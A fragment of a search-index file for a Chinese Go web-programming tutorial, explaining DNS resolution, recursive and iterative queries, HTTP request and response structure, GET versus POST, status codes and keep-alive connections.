<p>\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165www.qq.com\u57df\u540d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5148\u68c0\u67e5\u81ea\u5df1\u672c\u5730\u7684hosts\u6587\u4ef6\u662f\u5426\u6709\u8fd9\u4e2a\u7f51\u5740\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u679c\u6709\uff0c\u5c31\u5148\u8c03\u7528\u8fd9\u4e2aIP\u5730\u5740\u6620\u5c04\uff0c\u5b8c\u6210\u57df\u540d\u89e3\u6790\u3002</p> </li> <li> <p>\u5982\u679chosts\u91cc\u6ca1\u6709\u8fd9\u4e2a\u57df\u540d\u7684\u6620\u5c04\uff0c\u5219\u67e5\u627e\u672c\u5730DNS\u89e3\u6790\u5668\u7f13\u5b58\uff0c\u662f\u5426\u6709\u8fd9\u4e2a\u7f51\u5740\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u679c\u6709\uff0c\u76f4\u63a5\u8fd4\u56de\uff0c\u5b8c\u6210\u57df\u540d\u89e3\u6790\u3002</p> </li> <li> <p>\u5982\u679chosts\u4e0e\u672c\u5730DNS\u89e3\u6790\u5668\u7f13\u5b58\u90fd\u6ca1\u6709\u76f8\u5e94\u7684\u7f51\u5740\u6620\u5c04\u5173\u7cfb\uff0c\u9996\u5148\u4f1a\u627eTCP/IP\u53c2\u6570\u4e2d\u8bbe\u7f6e\u7684\u9996\u9009DNS\u670d\u52a1\u5668\uff0c\u5728\u6b64\u6211\u4eec\u53eb\u5b83\u672c\u5730DNS\u670d\u52a1\u5668\uff0c\u6b64\u670d\u52a1\u5668\u6536\u5230\u67e5\u8be2\u65f6\uff0c\u5982\u679c\u8981\u67e5\u8be2\u7684\u57df\u540d\uff0c\u5305\u542b\u5728\u672c\u5730\u914d\u7f6e\u533a\u57df\u8d44\u6e90\u4e2d\uff0c\u5219\u8fd4\u56de\u89e3\u6790\u7ed3\u679c\u7ed9\u5ba2\u6237\u673a\uff0c\u5b8c\u6210\u57df\u540d\u89e3\u6790\uff0c\u6b64\u89e3\u6790\u5177\u6709\u6743\u5a01\u6027\u3002</p> </li> <li> <p>\u5982\u679c\u8981\u67e5\u8be2\u7684\u57df\u540d\uff0c\u4e0d\u7531\u672c\u5730DNS\u670d\u52a1\u5668\u533a\u57df\u89e3\u6790\uff0c\u4f46\u8be5\u670d\u52a1\u5668\u5df2\u7f13\u5b58\u4e86\u6b64\u7f51\u5740\u6620\u5c04\u5173\u7cfb\uff0c\u5219\u8c03\u7528\u8fd9\u4e2aIP\u5730\u5740\u6620\u5c04\uff0c\u5b8c\u6210\u57df\u540d\u89e3\u6790\uff0c\u6b64\u89e3\u6790\u4e0d\u5177\u6709\u6743\u5a01\u6027\u3002</p> </li> <li> <p>\u5982\u679c\u672c\u5730DNS\u670d\u52a1\u5668\u672c\u5730\u533a\u57df\u6587\u4ef6\u4e0e\u7f13\u5b58\u89e3\u6790\u90fd\u5931\u6548\uff0c\u5219\u6839\u636e\u672c\u5730DNS\u670d\u52a1\u5668\u7684\u8bbe\u7f6e\uff08\u662f\u5426\u8bbe\u7f6e\u8f6c\u53d1\u5668\uff09\u8fdb\u884c\u67e5\u8be2\uff0c\u5982\u679c\u672a\u7528\u8f6c\u53d1\u6a21\u5f0f\uff0c\u672c\u5730DNS\u5c31\u628a\u8bf7\u6c42\u53d1\u81f3 \u201c\u6839DNS\u670d\u52a1\u5668\u201d\uff0c\u201c\u6839DNS\u670d\u52a1\u5668\u201d\u6536\u5230\u8bf7\u6c42\u540e\u4f1a\u5224\u65ad\u8fd9\u4e2a\u57df\u540d(.com)\u662f\u8c01\u6765\u6388\u6743\u7ba1\u7406\uff0c\u5e76\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8d1f\u8d23\u8be5\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\u7684\u4e00\u4e2aIP\u3002\u672c\u5730DNS\u670d\u52a1\u5668\u6536\u5230IP\u4fe1\u606f\u540e\uff0c\u5c06\u4f1a\u8054\u7cfb\u8d1f\u8d23.com\u57df\u7684\u8fd9\u53f0\u670d\u52a1\u5668\u3002\u8fd9\u53f0\u8d1f\u8d23.com\u57df\u7684\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5982\u679c\u81ea\u5df1\u65e0\u6cd5\u89e3\u6790\uff0c\u5b83\u5c31\u4f1a\u627e\u4e00\u4e2a\u7ba1\u7406.com\u57df\u7684\u4e0b\u4e00\u7ea7DNS\u670d\u52a1\u5668\u5730\u5740(qq.com)\u7ed9\u672c\u5730DNS\u670d\u52a1\u5668\u3002\u5f53\u672c\u5730DNS\u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2a\u5730\u5740\u540e\uff0c\u5c31\u4f1a\u627eqq.com\u57df\u670d\u52a1\u5668\uff0c\u91cd\u590d\u4e0a\u9762\u7684\u52a8\u4f5c\uff0c\u8fdb\u884c\u67e5\u8be2\uff0c\u76f4\u81f3\u627e\u5230www.qq.com\u4e3b\u673a\u3002</p> </li> <li> <p>\u5982\u679c\u7528\u7684\u662f\u8f6c\u53d1\u6a21\u5f0f\uff0c\u6b64DNS\u670d\u52a1\u5668\u5c31\u4f1a\u628a\u8bf7\u6c42\u8f6c\u53d1\u81f3\u4e0a\u4e00\u7ea7DNS\u670d\u52a1\u5668\uff0c\u7531\u4e0a\u4e00\u7ea7\u670d\u52a1\u5668\u8fdb\u884c\u89e3\u6790\uff0c\u4e0a\u4e00\u7ea7\u670d\u52a1\u5668\u5982\u679c\u4e0d\u80fd\u89e3\u6790\uff0c\u6216\u627e\u6839DNS\u6216\u628a\u8f6c\u8bf7\u6c42\u8f6c\u81f3\u4e0a\u4e0a\u7ea7\uff0c\u4ee5\u6b64\u5faa\u73af\u3002\u4e0d\u7ba1\u672c\u5730DNS\u670d\u52a1\u5668\u7528\u7684\u662f\u8f6c\u53d1\uff0c\u8fd8\u662f\u6839\u63d0\u793a\uff0c\u6700\u540e\u90fd\u662f\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u672c\u5730DNS\u670d\u52a1\u5668\uff0c\u7531\u6b64DNS\u670d\u52a1\u5668\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u673a\u3002</p> </li> </ol> <p></p> <p>\u56fe3.3 DNS\u89e3\u6790\u7684\u6574\u4e2a\u6d41\u7a0b</p> <p>\u6240\u8c13 <code>\u9012\u5f52\u67e5\u8be2\u8fc7\u7a0b</code> \u5c31\u662f \u201c\u67e5\u8be2\u7684\u9012\u4ea4\u8005\u201d \u66f4\u66ff, \u800c <code>\u8fed\u4ee3\u67e5\u8be2\u8fc7\u7a0b</code> \u5219\u662f \u201c\u67e5\u8be2\u7684\u9012\u4ea4\u8005\u201d\u4e0d\u53d8\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\u6765\u8bf4\uff0c\u4f60\u60f3\u77e5\u9053\u67d0\u4e2a\u4e00\u8d77\u4e0a\u6cd5\u5f8b\u8bfe\u7684\u5973\u5b69\u7684\u7535\u8bdd\uff0c\u5e76\u4e14\u4f60\u5077\u5077\u62cd\u4e86\u5979\u7684\u7167\u7247\uff0c\u56de\u5230\u5bdd\u5ba4\u544a\u8bc9\u4e00\u4e2a\u5f88\u4ed7\u4e49\u7684\u54e5\u4eec\u513f\uff0c\u8fd9\u4e2a\u54e5\u4eec\u513f\u4e8c\u8bdd\u6ca1\u8bf4\uff0c\u62cd\u7740\u80f8\u812f\u544a\u8bc9\u4f60\uff0c\u752d\u6025\uff0c\u6211\u66ff\u4f60\u67e5(\u6b64\u5904\u5b8c\u6210\u4e86\u4e00\u6b21\u9012\u5f52\u67e5\u8be2\uff0c\u5373\uff0c\u95ee\u8be2\u8005\u7684\u89d2\u8272\u66f4\u66ff)\u3002\u7136\u540e\u4ed6\u62ff\u7740\u7167\u7247\u95ee\u4e86\u5b66\u9662\u5927\u56db\u5b66\u957f\uff0c\u5b66\u957f\u544a\u8bc9\u4ed6\uff0c\u8fd9\u59d1\u5a18\u662fxx\u7cfb\u7684\uff1b\u7136\u540e\u8fd9\u54e5\u4eec\u513f\u9a6c\u4e0d\u505c\u8e44\u53c8\u95ee\u4e86xx\u7cfb\u7684\u529e\u516c\u5ba4\u4e3b\u4efb\u52a9\u7406\u540c\u5b66\uff0c\u52a9\u7406\u540c\u5b66\u8bf4\u662fxx\u7cfbyy\u73ed\u7684\uff0c\u7136\u540e\u5f88\u4ed7\u4e49\u7684\u54e5\u4eec\u513f\u53bbxx\u7cfbyy\u73ed\u7684\u73ed\u957f\u90a3\u91cc\u53d6\u5230\u4e86\u8be5\u5973\u5b69\u513f\u7535\u8bdd\u3002(\u6b64\u5904\u5b8c\u6210\u82e5\u5e72\u6b21\u8fed\u4ee3\u67e5\u8be2\uff0c\u5373\uff0c\u95ee\u8be2\u8005\u89d2\u8272\u4e0d\u53d8\uff0c\u4f46\u53cd\u590d\u66f4\u66ff\u95ee\u8be2\u5bf9\u8c61)\u6700\u540e\uff0c\u4ed6\u628a\u53f7\u7801\u4ea4\u5230\u4e86\u4f60\u624b\u91cc\u3002\u5b8c\u6210\u6574\u4e2a\u67e5\u8be2\u8fc7\u7a0b\u3002</p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u6b65\u9aa4\uff0c\u6211\u4eec\u6700\u540e\u83b7\u53d6\u7684\u662fIP\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u6d4f\u89c8\u5668\u6700\u540e\u53d1\u8d77\u8bf7\u6c42\u7684\u65f6\u5019\u662f\u57fa\u4e8eIP\u6765\u548c\u670d\u52a1\u5668\u505a\u4fe1\u606f\u4ea4\u4e92\u7684\u3002</p>"},{"location":"03.1/#http","title":"HTTP\u534f\u8bae\u8be6\u89e3","text":"<p>HTTP\u534f\u8bae\u662fWeb\u5de5\u4f5c\u7684\u6838\u5fc3\uff0c\u6240\u4ee5\u8981\u4e86\u89e3\u6e05\u695aWeb\u7684\u5de5\u4f5c\u65b9\u5f0f\u5c31\u9700\u8981\u8be6\u7ec6\u7684\u4e86\u89e3\u6e05\u695aHTTP\u662f\u600e\u4e48\u6837\u5de5\u4f5c\u7684\u3002</p> <p>HTTP\u662f\u4e00\u79cd\u8ba9Web\u670d\u52a1\u5668\u4e0e\u6d4f\u89c8\u5668(\u5ba2\u6237\u7aef)\u901a\u8fc7Internet\u53d1\u9001\u4e0e\u63a5\u6536\u6570\u636e\u7684\u534f\u8bae,\u5b83\u5efa\u7acb\u5728TCP\u534f\u8bae\u4e4b\u4e0a\uff0c\u4e00\u822c\u91c7\u7528TCP\u768480\u7aef\u53e3\u3002\u5b83\u662f\u4e00\u4e2a\u8bf7\u6c42\u3001\u54cd\u5e94\u534f\u8bae--\u5ba2\u6237\u7aef\u53d1\u51fa\u4e00\u4e2a\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u8fd9\u4e2a\u8bf7\u6c42\u3002\u5728HTTP\u4e2d\uff0c\u5ba2\u6237\u7aef\u603b\u662f\u901a\u8fc7\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\u4e0e\u53d1\u9001\u4e00\u4e2aHTTP\u8bf7\u6c42\u6765\u53d1\u8d77\u4e00\u4e2a\u4e8b\u52a1\u3002\u670d\u52a1\u5668\u4e0d\u80fd\u4e3b\u52a8\u53bb\u4e0e\u5ba2\u6237\u7aef\u8054\u7cfb\uff0c\u4e5f\u4e0d\u80fd\u7ed9\u5ba2\u6237\u7aef\u53d1\u51fa\u4e00\u4e2a\u56de\u8c03\u8fde\u63a5\u3002\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7aef\u90fd\u53ef\u4ee5\u63d0\u524d\u4e2d\u65ad\u4e00\u4e2a\u8fde\u63a5\u3002\u4f8b\u5982\uff0c\u5f53\u6d4f\u89c8\u5668\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u201c\u505c\u6b62\u201d\u952e\u6765\u4e2d\u65ad\u6587\u4ef6\u7684\u4e0b\u8f7d\uff0c\u5173\u95ed\u4e0e\u670d\u52a1\u5668\u7684HTTP\u8fde\u63a5\u3002</p> <p>HTTP\u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\uff0c\u540c\u4e00\u4e2a\u5ba2\u6237\u7aef\u7684\u8fd9\u6b21\u8bf7\u6c42\u548c\u4e0a\u6b21\u8bf7\u6c42\u662f\u6ca1\u6709\u5bf9\u5e94\u5173\u7cfb\u7684\uff0c\u5bf9HTTP\u670d\u52a1\u5668\u6765\u8bf4\uff0c\u5b83\u5e76\u4e0d\u77e5\u9053\u8fd9\u4e24\u4e2a\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u540c\u4e00\u4e2a\u5ba2\u6237\u7aef\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c Web\u7a0b\u5e8f\u5f15\u5165\u4e86Cookie\u673a\u5236\u6765\u7ef4\u62a4\u8fde\u63a5\u7684\u53ef\u6301\u7eed\u72b6\u6001\u3002</p> <p>HTTP\u534f\u8bae\u662f\u5efa\u7acb\u5728TCP\u534f\u8bae\u4e4b\u4e0a\u7684\uff0c\u56e0\u6b64TCP\u653b\u51fb\u4e00\u6837\u4f1a\u5f71\u54cdHTTP\u7684\u901a\u8baf\uff0c\u4f8b\u5982\u6bd4\u8f83\u5e38\u89c1\u7684\u4e00\u4e9b\u653b\u51fb\uff1aSYN Flood\u662f\u5f53\u524d\u6700\u6d41\u884c\u7684DoS\uff08\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff09\u4e0eDdoS\uff08\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff09\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u8fd9\u662f\u4e00\u79cd\u5229\u7528TCP\u534f\u8bae\u7f3a\u9677\uff0c\u53d1\u9001\u5927\u91cf\u4f2a\u9020\u7684TCP\u8fde\u63a5\u8bf7\u6c42\uff0c\u4ece\u800c\u4f7f\u5f97\u88ab\u653b\u51fb\u65b9\u8d44\u6e90\u8017\u5c3d\uff08CPU\u6ee1\u8d1f\u8377\u6216\u5185\u5b58\u4e0d\u8db3\uff09\u7684\u653b\u51fb\u65b9\u5f0f\u3002</p>"},{"location":"03.1/#http_1","title":"HTTP\u8bf7\u6c42\u5305\uff08\u6d4f\u89c8\u5668\u4fe1\u606f\uff09","text":"<p>\u6211\u4eec\u5148\u6765\u770b\u770bRequest\u5305\u7684\u7ed3\u6784, Request\u5305\u5206\u4e3a3\u90e8\u5206\uff0c\u7b2c\u4e00\u90e8\u5206\u53ebRequest line\uff08\u8bf7\u6c42\u884c\uff09, \u7b2c\u4e8c\u90e8\u5206\u53ebRequest header\uff08\u8bf7\u6c42\u5934\uff09,\u7b2c\u4e09\u90e8\u5206\u662fbody\uff08\u4e3b\u4f53\uff09\u3002header\u548cbody\u4e4b\u95f4\u6709\u4e2a\u7a7a\u884c\uff0c\u8bf7\u6c42\u5305\u7684\u4f8b\u5b50\u6240\u793a:</p> <pre><code>GET /domains/example/ HTTP/1.1      //\u8bf7\u6c42\u884c: \u8bf7\u6c42\u65b9\u6cd5 \u8bf7\u6c42URI HTTP\u534f\u8bae/\u534f\u8bae\u7248\u672c\nHost\uff1awww.iana.org               //\u670d\u52a1\u7aef\u7684\u4e3b\u673a\u540d\nUser-Agent\uff1aMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4          //\u6d4f\u89c8\u5668\u4fe1\u606f\nAccept\uff1atext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  //\u5ba2\u6237\u7aef\u80fd\u63a5\u6536\u7684MIME\nAccept-Encoding\uff1agzip,deflate,sdch       //\u662f\u5426\u652f\u6301\u6d41\u538b\u7f29\nAccept-Charset\uff1aUTF-8,*;q=0.5        //\u5ba2\u6237\u7aef\u5b57\u7b26\u7f16\u7801\u96c6\n//\u7a7a\u884c,\u7528\u4e8e\u5206\u5272\u8bf7\u6c42\u5934\u548c\u6d88\u606f\u4f53\n//\u6d88\u606f\u4f53,\u8bf7\u6c42\u8d44\u6e90\u53c2\u6570,\u4f8b\u5982POST\u4f20\u9012\u7684\u53c2\u6570\n</code></pre> <p>HTTP\u534f\u8bae\u5b9a\u4e49\u4e86\u5f88\u591a\u4e0e\u670d\u52a1\u5668\u4ea4\u4e92\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u6700\u57fa\u672c\u7684\u67094\u79cd\uff0c\u5206\u522b\u662fGET,POST,PUT,DELETE\u3002\u4e00\u4e2aURL\u5730\u5740\u7528\u4e8e\u63cf\u8ff0\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u8d44\u6e90\uff0c\u800cHTTP\u4e2d\u7684GET, POST, PUT, DELETE\u5c31\u5bf9\u5e94\u7740\u5bf9\u8fd9\u4e2a\u8d44\u6e90\u7684\u67e5\uff0c\u589e\uff0c\u6539\uff0c\u52204\u4e2a\u64cd\u4f5c\u3002\u6211\u4eec\u6700\u5e38\u89c1\u7684\u5c31\u662fGET\u548cPOST\u4e86\u3002GET\u4e00\u822c\u7528\u4e8e\u83b7\u53d6/\u67e5\u8be2\u8d44\u6e90\u4fe1\u606f\uff0c\u800cPOST\u4e00\u822c\u7528\u4e8e\u66f4\u65b0\u8d44\u6e90\u4fe1\u606f\u3002</p> <p>\u901a\u8fc7fiddler\u6293\u5305\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u8bf7\u6c42\u4fe1\u606f:</p> <p></p> <p>\u56fe3.4 fiddler\u6293\u53d6\u7684GET\u4fe1\u606f</p> <p></p> <p>\u56fe3.5 fiddler\u6293\u53d6\u7684POST\u4fe1\u606f</p> <p>\u6211\u4eec\u770b\u770bGET\u548cPOST\u7684\u533a\u522b:</p> <ol> <li>\u6211\u4eec\u53ef\u4ee5\u770b\u5230GET\u8bf7\u6c42\u6d88\u606f\u4f53\u4e3a\u7a7a\uff0cPOST\u8bf7\u6c42\u5e26\u6709\u6d88\u606f\u4f53\u3002</li> <li>GET\u63d0\u4ea4\u7684\u6570\u636e\u4f1a\u653e\u5728URL\u4e4b\u540e\uff0c\u4ee5<code>?</code>\u5206\u5272URL\u548c\u4f20\u8f93\u6570\u636e\uff0c\u53c2\u6570\u4e4b\u95f4\u4ee5<code>&amp;</code>\u76f8\u8fde\uff0c\u5982<code>EditPosts.aspx?name=test1&amp;id=123456</code>\u3002POST\u65b9\u6cd5\u662f\u628a\u63d0\u4ea4\u7684\u6570\u636e\u653e\u5728HTTP\u5305\u7684body\u4e2d\u3002</li> <li>GET\u63d0\u4ea4\u7684\u6570\u636e\u5927\u5c0f\u6709\u9650\u5236\uff08\u56e0\u4e3a\u6d4f\u89c8\u5668\u5bf9URL\u7684\u957f\u5ea6\u6709\u9650\u5236\uff09\uff0c\u800cPOST\u65b9\u6cd5\u63d0\u4ea4\u7684\u6570\u636e\u6ca1\u6709\u9650\u5236\u3002</li> <li>GET\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e\uff0c\u4f1a\u5e26\u6765\u5b89\u5168\u95ee\u9898\uff0c\u6bd4\u5982\u4e00\u4e2a\u767b\u5f55\u9875\u9762\uff0c\u901a\u8fc7GET\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e\u65f6\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\u5c06\u51fa\u73b0\u5728URL\u4e0a\uff0c\u5982\u679c\u9875\u9762\u53ef\u4ee5\u88ab\u7f13\u5b58\u6216\u8005\u5176\u4ed6\u4eba\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u53f0\u673a\u5668\uff0c\u5c31\u53ef\u4ee5\u4ece\u5386\u53f2\u8bb0\u5f55\u83b7\u5f97\u8be5\u7528\u6237\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u3002</li> </ol>"},{"location":"03.1/#http_2","title":"HTTP\u54cd\u5e94\u5305\uff08\u670d\u52a1\u5668\u4fe1\u606f\uff09","text":"<p>\u6211\u4eec\u518d\u6765\u770b\u770bHTTP\u7684response\u5305\uff0c\u4ed6\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>HTTP/1.1 200 OK                     //\u72b6\u6001\u884c\nServer: nginx/1.0.8                 //\u670d\u52a1\u5668\u4f7f\u7528\u7684WEB\u8f6f\u4ef6\u540d\u53ca\u7248\u672c\nDate:Date: Tue, 30 Oct 2012 04:14:25 GMT        //\u53d1\u9001\u65f6\u95f4\nContent-Type: text/html             //\u670d\u52a1\u5668\u53d1\u9001\u4fe1\u606f\u7684\u7c7b\u578b\nTransfer-Encoding: chunked          //\u8868\u793a\u53d1\u9001HTTP\u5305\u662f\u5206\u6bb5\u53d1\u7684\nConnection: keep-alive              //\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\nContent-Length: 90                  //\u4e3b\u4f53\u5185\u5bb9\u957f\u5ea6\n//\u7a7a\u884c \u7528\u6765\u5206\u5272\u6d88\u606f\u5934\u548c\u4e3b\u4f53\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"... //\u6d88\u606f\u4f53\n</code></pre> <p>Response\u5305\u4e2d\u7684\u7b2c\u4e00\u884c\u53eb\u505a\u72b6\u6001\u884c\uff0c\u7531HTTP\u534f\u8bae\u7248\u672c\u53f7\uff0c \u72b6\u6001\u7801\uff0c \u72b6\u6001\u6d88\u606f \u4e09\u90e8\u5206\u7ec4\u6210\u3002</p> <p>\u72b6\u6001\u7801\u7528\u6765\u544a\u8bc9HTTP\u5ba2\u6237\u7aef,HTTP\u670d\u52a1\u5668\u662f\u5426\u4ea7\u751f\u4e86\u9884\u671f\u7684Response\u3002HTTP/1.1\u534f\u8bae\u4e2d\u5b9a\u4e49\u4e865\u7c7b\u72b6\u6001\u7801\uff0c \u72b6\u6001\u7801\u7531\u4e09\u4f4d\u6570\u5b57\u7ec4\u6210\uff0c\u7b2c\u4e00\u4e2a\u6570\u5b57\u5b9a\u4e49\u4e86\u54cd\u5e94\u7684\u7c7b\u522b</p> <ul> <li>1XX  \u63d0\u793a\u4fe1\u606f         - \u8868\u793a\u8bf7\u6c42\u5df2\u88ab\u6210\u529f\u63a5\u6536\uff0c\u7ee7\u7eed\u5904\u7406</li> <li>2XX  \u6210\u529f           - \u8868\u793a\u8bf7\u6c42\u5df2\u88ab\u6210\u529f\u63a5\u6536\uff0c\u7406\u89e3\uff0c\u63a5\u53d7</li> <li>3XX  \u91cd\u5b9a\u5411      - \u8981\u5b8c\u6210\u8bf7\u6c42\u5fc5\u987b\u8fdb\u884c\u66f4\u8fdb\u4e00\u6b65\u7684\u5904\u7406</li> <li>4XX  \u5ba2\u6237\u7aef\u9519\u8bef    - \u8bf7\u6c42\u6709\u8bed\u6cd5\u9519\u8bef\u6216\u8bf7\u6c42\u65e0\u6cd5\u5b9e\u73b0</li> <li>5XX  \u670d\u52a1\u5668\u7aef\u9519\u8bef   - \u670d\u52a1\u5668\u672a\u80fd\u5b9e\u73b0\u5408\u6cd5\u7684\u8bf7\u6c42</li> </ul> <p>\u6211\u4eec\u770b\u4e0b\u9762\u8fd9\u4e2a\u56fe\u5c55\u793a\u4e86\u8be6\u7ec6\u7684\u8fd4\u56de\u4fe1\u606f\uff0c\u5de6\u8fb9\u53ef\u4ee5\u770b\u5230\u6709\u5f88\u591a\u7684\u8d44\u6e90\u8fd4\u56de\u7801\uff0c200\u662f\u5e38\u7528\u7684\uff0c\u8868\u793a\u6b63\u5e38\u4fe1\u606f\uff0c302\u8868\u793a\u8df3\u8f6c\u3002response header\u91cc\u9762\u5c55\u793a\u4e86\u8be6\u7ec6\u7684\u4fe1\u606f\u3002</p> <p></p> <p>\u56fe3.6 \u8bbf\u95ee\u4e00\u6b21\u7f51\u7ad9\u7684\u5168\u90e8\u8bf7\u6c42\u4fe1\u606f</p>"},{"location":"03.1/#httpconnection-keep-alive","title":"HTTP\u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\u548cConnection: keep-alive\u7684\u533a\u522b","text":"<p>\u65e0\u72b6\u6001\u662f\u6307\u534f\u8bae\u5bf9\u4e8e\u4e8b\u52a1\u5904\u7406\u6ca1\u6709\u8bb0\u5fc6\u80fd\u529b\uff0c\u670d\u52a1\u5668\u4e0d\u77e5\u9053\u5ba2\u6237\u7aef\u662f\u4ec0\u4e48\u72b6\u6001\u3002\u4ece\u53e6\u4e00\u65b9\u9762\u8bb2\uff0c\u6253\u5f00\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\u548c\u4f60\u4e4b\u524d\u6253\u5f00\u8fd9\u4e2a\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u8054\u7cfb\u3002</p> <p>HTTP\u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u7684\u9762\u5411\u8fde\u63a5\u7684\u534f\u8bae\uff0c\u65e0\u72b6\u6001\u4e0d\u4ee3\u8868HTTP\u4e0d\u80fd\u4fdd\u6301TCP\u8fde\u63a5\uff0c\u66f4\u4e0d\u80fd\u4ee3\u8868HTTP\u4f7f\u7528\u7684\u662fUDP\u534f\u8bae\uff08\u9762\u5bf9\u65e0\u8fde\u63a5\uff09\u3002</p> <p>\u4eceHTTP/1.1\u8d77\uff0c\u9ed8\u8ba4\u90fd\u5f00\u542f\u4e86Keep-Alive\u4fdd\u6301\u8fde\u63a5\u7279\u6027\uff0c\u7b80\u5355\u5730\u8bf4\uff0c\u5f53\u4e00\u4e2a\u7f51\u9875\u6253\u5f00\u5b8c\u6210\u540e\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7528\u4e8e\u4f20\u8f93HTTP\u6570\u636e\u7684TCP\u8fde\u63a5\u4e0d\u4f1a\u5173\u95ed\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0c\u4f1a\u7ee7\u7eed\u4f7f\u7528\u8fd9\u4e00\u6761\u5df2\u7ecf\u5efa\u7acb\u7684TCP\u8fde\u63a5\u3002</p> <p>Keep-Alive\u4e0d\u4f1a\u6c38\u4e45\u4fdd\u6301\u8fde\u63a5\uff0c\u5b83\u6709\u4e00\u4e2a\u4fdd\u6301\u65f6\u95f4\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u670d\u52a1\u5668\u8f6f\u4ef6\uff08\u5982Apache\uff09\u4e2d\u8bbe\u7f6e\u8fd9\u4e2a\u65f6\u95f4\u3002</p>"},{"location":"03.1/#_1","title":"\u8bf7\u6c42\u5b9e\u4f8b","text":"<p>\u56fe3.7 \u4e00\u6b21\u8bf7\u6c42\u7684request\u548cresponse</p> <p>\u4e0a\u9762\u8fd9\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u4e86\u89e3\u5230\u6574\u4e2a\u7684\u901a\u8baf\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ec6\u5fc3\u7684\u8bfb\u8005\u662f\u5426\u6ce8\u610f\u5230\u4e86\u4e00\u70b9\uff0c\u4e00\u4e2aURL\u8bf7\u6c42\u4f46\u662f\u5de6\u8fb9\u680f\u91cc\u9762\u4e3a\u4ec0\u4e48\u4f1a\u6709\u90a3\u4e48\u591a\u7684\u8d44\u6e90\u8bf7\u6c42(\u8fd9\u4e9b\u90fd\u662f\u9759\u6001\u6587\u4ef6\uff0cgo\u5bf9\u4e8e\u9759\u6001\u6587\u4ef6\u6709\u4e13\u95e8\u7684\u5904\u7406\u65b9\u5f0f)\u3002</p> <p>\u8fd9\u4e2a\u5c31\u662f\u6d4f\u89c8\u5668\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7b2c\u4e00\u6b21\u8bf7\u6c42url\uff0c\u670d\u52a1\u5668\u7aef\u8fd4\u56de\u7684\u662fhtml\u9875\u9762\uff0c\u7136\u540e\u6d4f\u89c8\u5668\u5f00\u59cb\u6e32\u67d3HTML\uff1a\u5f53\u89e3\u6790\u5230HTML DOM\u91cc\u9762\u7684\u56fe\u7247\u8fde\u63a5\uff0ccss\u811a\u672c\u548cjs\u811a\u672c\u7684\u94fe\u63a5\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u81ea\u52a8\u53d1\u8d77\u4e00\u4e2a\u8bf7\u6c42\u9759\u6001\u8d44\u6e90\u7684HTTP\u8bf7\u6c42\uff0c\u83b7\u53d6\u76f8\u5bf9\u5e94\u7684\u9759\u6001\u8d44\u6e90\uff0c\u7136\u540e\u6d4f\u89c8\u5668\u5c31\u4f1a\u6e32\u67d3\u51fa\u6765\uff0c\u6700\u7ec8\u5c06\u6240\u6709\u8d44\u6e90\u6574\u5408\u3001\u6e32\u67d3\uff0c\u5b8c\u6574\u5c55\u73b0\u5728\u6211\u4eec\u9762\u524d\u7684\u5c4f\u5e55\u4e0a\u3002</p> 